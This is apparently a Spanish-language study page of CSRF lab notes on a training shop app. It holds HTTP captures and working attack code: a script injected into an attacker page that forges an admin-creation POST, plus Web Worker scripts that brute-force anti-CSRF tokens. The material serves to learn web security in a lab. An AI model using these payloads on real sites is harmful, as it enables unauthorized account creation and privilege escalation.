---
layout: default
---

# XSRF

## Teoría


## Laboratorios


```

Description

You are a soft-administrator of the Pawn Own Shop! and have decided to add your friend Malice to the administrator list.
However, you cannot do this because only Mrs Gallegos can do it.

So you have to find a way to add you friend:
Data 	Value
name 	Malice
surname 	Smith
email 	malice@hacker.site
role 	ADMIN



FYI, each level in Pawn Own Shop! is vulnerbale to CrossSite Request Forgery. Here are some other useful information:

To study the web application here is your login: username: Padawan
password: TheLittlePadawan



Note: Mrs Gallegos is always visiting your site: hacker.site.
If you don't remind, the IP address of your box is: 10.100.13.33 and your SSH login is:

username: r00t
password: Don't worry be happy


Enjoy!! 
```

### Lab CSRF 1

```
CSRF 1 	This level is just a warm-up to become familiar with the application 	WARM-UP 	Simple warm-up
```

core.js:

```javascript
function AddUser() {

	params = {
		"name" : document.getElementById("firstname").value,
		"surname" : document.getElementById("surname").value,
		"email" : document.getElementById("email").value,
		"role" : ( document.getElementById("r2").checked ) ? "ADMIN" :  "USER", 
		"submit" : "",
		};
		
	$.ajax({
		url : "add_user.php",
		type : "POST",		
		data: params, 
		success : function(data) {
			$('#addResult').text("");
			$('#addResult').append(data.message);
			
			$("#addResult").removeClass( "alert-danger " );								
			$("#addResult").removeClass( "alert-success " );								
			if(data.status == 'success'){				
				$("#addResult").addClass( "alert-success" );			
				window.setTimeout(function(){location.reload();}, 1000);
			
			}else{				
				$("#addResult").addClass( "alert-danger" );								
			}
			
			$("#addResult").show();
			
		},
		error: function(data){
			$('#addResult').text("An error has occurred server-side :( ");
			$("#addResult").show();
		},
		dataType : "json"
	});

};
```
Request al servicio web objetivo:
```
POST /add_user.php HTTP/1.1
Host: 1.csrf.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 71
Origin: http://1.csrf.labs
Connection: close
Referer: http://1.csrf.labs/users.php
Cookie: PHPSESSID=db9q7oe1nqplig5ib5u9j780l3

name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=
```

Response:
```
HTTP/1.1 200 OK
Date: Thu, 02 Jan 2025 05:40:51 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 114
Connection: close
Content-Type: text/html


{"status":"error","message":"I'm sorry Padawan but only Super Administrators can add other administrator users."}
```


Request a hacker site:

```
GET / HTTP/1.1
Host: hacker.site
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
Response:
```
HTTP/1.1 200 OK
Date: Thu, 02 Jan 2025 05:43:25 GMT
Server: Apache/2.4.52 (Debian)
Last-Modified: Wed, 15 Jun 2022 12:47:05 GMT
ETag: "5f-5e17beb180440-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 95
Connection: close
Content-Type: text/html

<html>

<body bgcolor="#000000">
	<img src="hackerinside.jpg" />
</body>

</html>
```


Se añade código malicioso al sitio http://hacker.site

```
root@INE:~# cat /var/www/html/index.html 
<html>

<body bgcolor="#000000">
        <img src="hackerinside.jpg" />
</body>


<script type="text/javascript">
   var url =  "http://1.csrf.labs/add_user.php";
   var params =  "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=";
   var CSRF = new XMLHttpRequest();
   CSRF.open("POST", url, true);
   CSRF.withCredentials = 'true'; //IMPORTANT MUST!!
   CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   CSRF.send(params);
</script>

</html>

```
```
data: cookie=BEEFHOOK=CBIIuuV13yc711WsqHHuz2PG7THd4LbGU2IfP3RS4IpSQhTyUYcg5oPoQtOKcavPWmPbHA1Cb1kLY70r
```




### Lab CSRF 2

```
CSRF 2 	Are you able to exploit a CSRF using an XSS? 	EASY 	There is always an XSS .. 
```

### Lab CSRF 3

```
CSRF 3 	What if the application implements Anti-CSRF measures? Find a way to make useless the Anti-CSRF token. 	EASY 	Anti-CSRF? It's a joke! 
```

### Lab CSRF 4

```
CSRF 4 	String Anti-CSRF tokens?! Nah, if you know how to analyze them 	MEDIUM 	Ten Little Indians.. 
```

### Lab CSRF 5

```
CSRF 5 	Are you still able to bruteforce that tokens? 	ADVANCED 	Worker on the Web or Web Worker?
```

### Material


```javascript

<html>
   <head>
      <script src="/solutions/jquery-latest.min.js" type="text/javascript"></script>
   </head>
        <body>

                <h1>Anti-CSRF Tokens to test</h1>
                <textarea id="tokens" rows="12" cols="60">
         1679091c5a880faf6fb5e6087eb1b2dc
         45c48cce2e2d7fbdea1afc51c7c6ad26
         8f14e45fceea167a5a36dedd4bea2543
         a87ff679a2f3e71d9181a67b7542122c
         c4ca4238a0b923820dcc509a6f75849b
         c81e728d9d4c2f636f067f89cc14862c
         c9f0f895fb98ab9159f51fd0297e236d
         cfcd208495d565ef66e7dff9f98764da
         d3d9446802a44259755d38e6d163e820
         e4da3b7fbbce2345d7772b0674a318d5
         eccbc87e4b5ce2fe28308fd9f2a7baf3
      </textarea>

      

                <script>
                        function bruteLoop(TList) {
                                for (var i = 0; i < TList.length; i++) {
                                        console.info("Testing: " + TList[i]);
                                        XHRPost(TList[i]);
                                }
                        }

                        function XHRPost(tVal) {
                                var http = new XMLHttpRequest();
                                var url = "http://{LABID}.csrf.labs/add_user.php";

                                var token = tVal;

                                params = {
                                        "name" : "Malice",
                                        "surname" : "Smith",
                                        "email" : "malice@hacker.site",
                                        "role" : "ADMIN",
                                        "submit" : "",
                                        "CSRFToken" : token,
                                };
            
             
                                http.open("POST", url, true);
                                http.withCredentials = 'true';
                                //Send the proper header information along with the request
                                http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                                http.onreadystatechange = function() {
                                        if (http.readyState > 1) {//We don't care about responses
                                                //console.warn("Aborted " + token + " with status " + http.readyState);
                                                //http.abort();
                                        }
                                }

                     //Serialize the data without using JQuery 
                                queryParams = Object.keys(params).reduce(function(a,k){a.push(k+'='+encodeURIComponent(params[k]));return a},[]).join('&');
                                http.send(queryParams);
                        }



                        var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
                        tokens = tokens.filter(Boolean); // Remove empty lines

                        // Brute Loop
                        bruteLoop(tokens);

                </script>
        </body>
</html>

```


brute.js:

```javascript
self.addEventListener('message', function(e) {

        var tokens = e.data.tokens;

        function bruteLoop(TList) {
                for (var i = 0; i < TList.length; i++) {
                        console.info("Testing: " + TList[i]);
                        XHRPost(TList[i]);
                }

                Terminator();
        }

        function XHRPost(tVal) {
                var http = new XMLHttpRequest();
                var url = "http://{LABID}.csrf.labs/add_user.php";

                var token = tVal;

                params = {
                        "name" : "Malice",
                        "surname" : "Smith",
                        "email" : "malice@hacker.site",
                        "role" : "ADMIN",
                        "submit" : "",
                        "CSRFToken" : token,
                };
    
     
                http.open("POST", url, true);
                http.withCredentials = 'true';
                //Send the proper header information along with the request
                http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                http.onreadystatechange = function() {
                        if (http.readyState > 1) {//We don't care about responses
                                //console.warn("Aborted " + token + " with status " + http.readyState);
                                //http.abort();
                        }
                }

         //Serialize the data without using JQuery 
                queryParams = Object.keys(params).reduce(function(a,k){a.push(k+'='+encodeURIComponent(params[k]));return a},[]).join('&');
                http.send(queryParams);
        }

        function Terminator() {
                self.postMessage( "Sir, I've finished... see you later");
                self.close();
                return;
        }

        // Brute Loop
        bruteLoop(tokens);


}, false);
```

pwnownshop.site.bruter.js
```javascript
self.addEventListener('message', function(e) {
        var tokens = e.data.tokens;
        function bruteLoop(TList) {
                for (var i = 0; i < TList.length; i++) {
                        console.info("Testing: " + TList[i]);
                        XHRPost(TList[i]);
                }
                Terminator();
        }
        function XHRPost(tVal) {
                var http = new XMLHttpRequest();
                var url = "http://pwnownshop.site/add_user.php";

                var token = tVal;

                params = {
                        "name" : "Malice",
                        "surname" : "Smith",
                        "email" : "malice@hacker.site",
                        "role" : "ADMIN",
                        "submit" : "",
                        "CSRFToken" : token,
                };
    
     
                http.open("POST", url, true);
                http.withCredentials = 'true';
                //Send the proper header information along with the request
                http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                http.onreadystatechange = function() {
                        if (http.readyState > 1) {//We don't care about responses
                                http.abort();
                        }
                }

         //Serialize the data without using JQuery 
                queryParams = Object.keys(params).reduce(function(a,k){a.push(k+'='+encodeURIComponent(params[k]));return a},[]).join('&');
                http.send(queryParams);
        }

        function Terminator() {
                self.postMessage( "Sir, I've finished... see you later");
                self.close();
                return;
        }

        // Brute Loop
        bruteLoop(tokens);
}, false); 

```

BrutePOST_worker.html:
```html
<html>
        <body>
                <h1>Anti-CSRF Tokens to test</h1>
                <textarea id="tokens" rows="12" cols="60">
         00411460f7c92d2124a67ea0f4cb5f85
      </textarea>
                <br>
                <h1>Workers results</h1>

                <span id="workers"></span>
 
                <script>
                        function startBlock(worker, tokens) {
                                worker.postMessage({
                                        'tokens' : tokens
                                });
                        }

                        var bruterPath ="csrf.labs.bruter.js";

                        var ww1 = new Worker(bruterPath);
                        ww1.addEventListener('message', function(e) {
                                document.getElementById("workers").innerHTML += "<b>ww1</b> says: " + e.data + "<br>";
                        }, false);


                        var ww2 = new Worker(bruterPath);
                        ww2.addEventListener('message', function(e) {
                                document.getElementById("workers").innerHTML += "<b>ww2</b> says: " + e.data + "<br>";
                        }, false);


                        var ww3 = new Worker(bruterPath);
                        ww3.addEventListener('message', function(e) {
                                document.getElementById("workers").innerHTML += "<b>ww3</b> says: " + e.data + "<br>";
                        }, false);


                        var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
                        tokens = tokens.filter(Boolean);



                        startBlock(ww1, tokens.slice(0,333));
                        startBlock(ww2, tokens.slice(333,666));
                        startBlock(ww3, tokens.slice(666,tokens.length));


                </script>

                <div>
                        <img src="counter.gif" />
                </div>
        </body>
</html>
```






[back](./)

